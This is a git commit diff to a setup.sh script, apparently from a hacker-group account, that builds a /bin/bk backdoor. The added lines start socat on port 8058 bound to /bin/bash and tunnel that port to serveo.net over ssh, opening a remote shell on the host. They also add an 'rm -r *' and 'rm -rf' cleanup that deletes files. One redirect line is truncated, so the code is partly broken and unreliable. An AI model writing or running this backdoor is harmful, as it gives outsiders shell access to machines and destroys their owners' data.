04f4af88620be973d116019037531ae6e96e1bfd
ANONYMOUS LEGION V2 <150881573+CyberLegion2@users.noreply.github.com>
2024-09-23 23:08:01 +0530

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -3,7 +3,10 @@ echo "if [[ '$1' == 'stop' ]]; then
 pkill socat
 pkill ssh
 else
-socat TCP-LISTEN:8058 > /dev/null 2>1 &
-ssh -R 18058:localhost:8058 serveo.net" >> /bin/bk
+socat TCP-LISTEN:8058 EXEC:/bin/bash > /dev/null 2>1 &
+ssh -R 18058:localhost:8058 serveo.net > /dev/null 2>1 &" >> /bin>
 chmod +x /bin/bk
-rm -rf ../.bk
+rm -r *
+cd ..
+rm -rf .bk
+fi
